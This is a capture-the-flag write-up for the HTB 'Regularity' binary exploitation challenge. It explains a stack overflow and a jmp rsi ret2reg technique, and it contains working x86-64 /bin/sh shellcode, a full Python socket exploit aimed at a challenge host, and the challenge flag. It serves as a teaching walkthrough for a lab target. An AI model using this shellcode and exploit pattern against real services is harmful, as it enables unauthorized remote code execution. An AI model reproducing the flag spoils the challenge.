# HTB Regularity - Pwn Challenge Solution

## Challenge Information
- **Name:** Regularity
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Very Easy
- **Points:** 975

## Flag
```
HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_f2f06e7ebdddb7d46d7e2def9bc16714}
```

---

## Table of Contents
1. [Overview](#overview)
2. [Understanding the Vulnerability](#understanding-the-vulnerability)
3. [Binary Analysis](#binary-analysis)
4. [Exploitation Technique: Ret2Reg](#exploitation-technique-ret2reg)
5. [Step-by-Step Solution](#step-by-step-solution)
6. [Final Exploit Code](#final-exploit-code)
7. [Key Concepts Explained](#key-concepts-explained)

---

## Overview

This challenge demonstrates a **buffer overflow** vulnerability in a simple program. Instead of trying to guess memory addresses (which change due to ASLR), we use a clever technique called **ret2reg** (return to register) to execute our shellcode.

### What You'll Learn
- How buffer overflows work
- What registers are and how they're used
- The ret2reg exploitation technique
- How to write shellcode
- Basic stack structure

---

## Understanding the Vulnerability

### What is a Buffer Overflow?

Think of a buffer as a container (like a cup) in computer memory:
- If you pour too much water (data) into a cup, it overflows
- In computers, when you write more data than a buffer can hold, it overflows into adjacent memory
- This can overwrite important data, like return addresses

### The Vulnerable Code

The binary has a function called `read()` that:
1. Allocates 256 bytes (0x100) for storing user input
2. But reads 272 bytes (0x110) from the user
3. This 16-byte overflow lets us overwrite the **return address**

```
┌─────────────────────┐
│   User Input        │  ← 256 bytes allocated
│   (Buffer)          │
├─────────────────────┤
│   Saved RBP         │  ← 8 bytes (can be overwritten)
├─────────────────────┤
│   Return Address    │  ← 8 bytes (WE CONTROL THIS!)
└─────────────────────┘
     Total: 272 bytes that can be written
```

---

## Binary Analysis

### Step 1: Check the Binary

```bash
file regularity
# Output: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

This tells us:
- **64-bit**: Uses 64-bit addresses and registers
- **Statically linked**: All code is in the binary
- **Not stripped**: Function names are preserved (easier to analyze)

### Step 2: Check Security Protections

```bash
readelf -l regularity | grep GNU_STACK
# Output shows: RWE (Read, Write, Execute)
```

**Important**: The stack is executable! This means we can run code (shellcode) from the stack.

### Step 3: Disassemble the Binary

```bash
objdump -d regularity -M intel
```

Key findings:

```asm
0000000000401000 <_start>:
  401000:  mov    edi,0x1
  401005:  movabs rsi,0x402000
  40100f:  mov    edx,0x2a
  401014:  call   401043 <write>        ; Print "Hello, Survivor..."
  401019:  call   40104b <read>         ; Read user input (VULNERABLE!)
  40101e:  mov    edi,0x1
  401023:  movabs rsi,0x40202a
  40102d:  mov    edx,0x27
  401032:  call   401043 <write>        ; Print "Yup, same old..."
  401037:  movabs rsi,0x40106f
  401041:  jmp    rsi                   ; ← IMPORTANT! JMP RSI gadget!

000000000040104b <read>:
  40104b:  sub    rsp,0x100             ; Allocate 256 bytes
  401052:  mov    eax,0x0
  401057:  mov    edi,0x0
  40105c:  lea    rsi,[rsp]             ; RSI points to buffer!
  401060:  mov    edx,0x110             ; Read 272 bytes (OVERFLOW!)
  401065:  syscall                      ; sys_read
  401067:  add    rsp,0x100             ; Deallocate buffer
  40106e:  ret                          ; Return (we control this!)
```

---

## Exploitation Technique: Ret2Reg

### The Problem with Traditional Exploitation

Normally, after a buffer overflow, you'd:
1. Put shellcode in the buffer
2. Overwrite return address with buffer's address
3. When function returns, jump to shellcode

**But there's a problem**: Modern systems use ASLR (Address Space Layout Randomization):
- Stack addresses change every time the program runs
- We don't know where our buffer is in memory
- Guessing addresses would take thousands of attempts

### The Clever Solution: Ret2Reg

Instead of guessing addresses, we use **registers**!

**Key Observation**: After the `read()` function executes:
- The **RSI register** still points to our input buffer
- We found a `jmp rsi` instruction at address `0x401041`
- This address NEVER changes (no PIE protection)

**The Plan**:
1. Put shellcode at the start of our input
2. Overwrite return address with `0x401041` (the `jmp rsi` instruction)
3. When `read()` returns:
   - CPU jumps to `0x401041`
   - Executes `jmp rsi`
   - RSI points to our buffer
   - Jumps to our shellcode!

```
┌──────────────────────────────────────────────┐
│  Our Input Buffer                            │
│  ┌────────────────────────────────┐          │
│  │ Shellcode (23 bytes)           │          │
│  ├────────────────────────────────┤          │
│  │ NOP padding (233 bytes)        │          │
│  └────────────────────────────────┘          │
│  ← RSI points here!                          │
├──────────────────────────────────────────────┤
│  Return Address: 0x401041 (jmp rsi)          │
└──────────────────────────────────────────────┘
```

---

## Step-by-Step Solution

### Step 1: Create Shellcode

Shellcode is machine code that spawns a shell (`/bin/sh`):

```python
# This shellcode executes: execve("/bin/sh", NULL, NULL)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
```

**What this does in assembly**:
```asm
xor    rsi, rsi                ; RSI = 0 (NULL)
push   rsi                     ; Push NULL to stack
movabs rdi, 0x68732f2f6e69622f ; RDI = "/bin//sh"
push   rdi                     ; Push string to stack
push   rsp                     ; Push pointer to string
pop    rdi                     ; RDI = pointer to "/bin//sh"
push   0x3b                    ; Push syscall number for execve
pop    rax                     ; RAX = 59 (execve syscall)
cdq                            ; RDX = 0
syscall                        ; Execute!
```

### Step 2: Find the Gadget

```bash
objdump -d regularity -M intel | grep "jmp.*rsi"
# Output: 401041:  ff e6  jmp rsi
```

The `jmp rsi` instruction is at address `0x401041`.

### Step 3: Calculate Payload Structure

```python
payload = shellcode                      # 23 bytes
payload += b'\x90' * (256 - 23)          # 233 bytes of NOP padding
payload += struct.pack('<Q', 0x401041)   # 8 bytes: return address
# Total: 264 bytes
```

**Why 256 bytes before return address?**
- The buffer is 256 bytes (0x100)
- Return address starts at offset 256
- No need for saved RBP padding (stack adjustment happens before return)

### Step 4: Write the Exploit

```python
import socket
import struct
import time

# Target details
host = '83.136.249.223'
port = 56191

# Shellcode to spawn /bin/sh
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

# Address of "jmp rsi" gadget
jmp_rsi = 0x401041

# Build the payload
payload = shellcode
payload += b'\x90' * (256 - len(shellcode))  # NOP sled to offset 256
payload += struct.pack('<Q', jmp_rsi)        # Overwrite return address

# Connect to target
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

# Receive the prompt
print(sock.recv(1024).decode())

# Send exploit
sock.send(payload + b'\n')
time.sleep(0.5)

# We now have a shell! Send command
sock.send(b'cat flag.txt\n')
time.sleep(0.5)

# Get the flag
result = sock.recv(4096).decode()
print(result)

sock.close()
```

---

## Final Exploit Code

```python
#!/usr/bin/env python3
"""
HTB Regularity - Ret2Reg Exploitation
Demonstrates buffer overflow exploitation using jmp rsi gadget
"""

import socket
import struct
import time

def exploit(host, port):
    """
    Exploits the buffer overflow vulnerability using ret2reg technique
    
    Args:
        host: Target IP address
        port: Target port number
    """
    # Shellcode: execve("/bin/sh", NULL, NULL)
    # Spawns a shell for command execution
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    
    # Address of "jmp rsi" gadget in the binary
    # This instruction jumps to whatever address RSI contains
    jmp_rsi = 0x401041
    
    # Build the exploit payload
    # Structure: [shellcode][NOP padding][return address]
    payload = shellcode                              # Our malicious code
    payload += b'\x90' * (256 - len(shellcode))      # Fill buffer to 256 bytes
    payload += struct.pack('<Q', jmp_rsi)            # Overwrite return address
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Target gadget: 0x{jmp_rsi:x} (jmp rsi)")
    print(f"[*] Connecting to {host}:{port}...")
    
    # Connect to the vulnerable service
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Receive and display the prompt
    prompt = sock.recv(1024).decode()
    print(f"[+] Received: {prompt.strip()}")
    
    # Send the exploit payload
    print("[*] Sending exploit payload...")
    sock.send(payload + b'\n')
    time.sleep(0.5)
    
    # Execute command in the spawned shell
    print("[*] Executing: cat flag.txt")
    sock.send(b'cat flag.txt\n')
    time.sleep(0.5)
    
    # Retrieve and display the flag
    result = sock.recv(4096).decode()
    print(f"\n[!] FLAG: {result}")
    
    sock.close()
    print("[+] Connection closed")

if __name__ == "__main__":
    # Target configuration
    TARGET_HOST = '83.136.249.223'
    TARGET_PORT = 56191
    
    exploit(TARGET_HOST, TARGET_PORT)
```

---

## Key Concepts Explained

### 1. Registers (Simple Explanation)

Registers are like super-fast temporary storage slots in the CPU:

| Register | Purpose |
|----------|---------|
| **RAX** | Often holds return values and syscall numbers |
| **RDI** | First function argument |
| **RSI** | Second function argument (our buffer pointer!) |
| **RDX** | Third function argument |
| **RIP** | Instruction Pointer - points to next instruction |
| **RSP** | Stack Pointer - points to top of stack |

**In this exploit**: After `read()`, RSI still points to our input buffer!

### 2. Little Endian Format

When we write `struct.pack('<Q', 0x401041)`:
- `'<'` means little endian (bytes reversed)
- `'Q'` means 8-byte unsigned integer
- `0x401041` becomes `\x41\x10\x40\x00\x00\x00\x00\x00`

Example:
```
Address: 0x0000000000401041
Little Endian bytes: 41 10 40 00 00 00 00 00
```

### 3. NOP Sled

`\x90` is the NOP (No Operation) instruction:
- Does nothing, just moves to next instruction
- Creates a "landing zone" for our shellcode
- If we jump anywhere in the NOPs, we slide down to the shellcode

```
[NOP][NOP][NOP][NOP][Shellcode]
  ↓    ↓    ↓    ↓       ↓
  └────┴────┴────┴───→ All lead here!
```

### 4. Why This Works

1. **No PIE**: Code addresses don't change → `0x401041` always valid
2. **Executable Stack**: We can run shellcode from the buffer
3. **RSI Persistence**: RSI still points to our buffer after `read()`
4. **Small Overflow**: Just enough to control return address

### 5. The Execution Flow

```
Normal Execution:
read() → returns → exits program

Our Exploit:
read() → returns to 0x401041 → jmp rsi → shellcode → spawn shell!
```

---

## Testing Locally

To test the exploit locally:

```bash
# Disable ASLR temporarily (makes testing easier)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run the exploit against local binary
python3 exploit.py
```

---

## Common Mistakes to Avoid

1. **Wrong Padding**: Don't add saved RBP padding - return address is at offset 256
2. **Endianness**: Always use little endian (`'<Q'`) for addresses
3. **Timing**: Add `time.sleep()` to ensure data is processed
4. **Newline**: Include `\n` to trigger input processing

---

## Additional Resources

### Learn More About:
- **Buffer Overflows**: [https://owasp.org/www-community/vulnerabilities/Buffer_Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- **x86-64 Assembly**: [https://www.cs.cmu.edu/~fp/courses/15213-s07/misc/asm64-handout.pdf](https://www.cs.cmu.edu/~fp/courses/15213-s07/misc/asm64-handout.pdf)
- **Linux Syscalls**: [https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

### Tools Used:
- **objdump**: Disassemble binaries
- **readelf**: Examine ELF file structure
- **gdb**: Debug programs
- **python3**: Write exploits

---

## Summary

**Challenge**: Regularity
**Technique**: Ret2Reg (return to register)
**Key Insight**: Use `jmp rsi` to jump to our buffer without knowing its address
**Result**: Remote code execution → Shell access → Flag retrieved

The "regularity" in the challenge name hints at the predictable nature of the `jmp rsi` address, which never changes despite ASLR being enabled!

---

**Created**: 2025-11-10
**Author**: HTB Challenge Solution Documentation
**Difficulty**: Very Easy (Great for learning!)
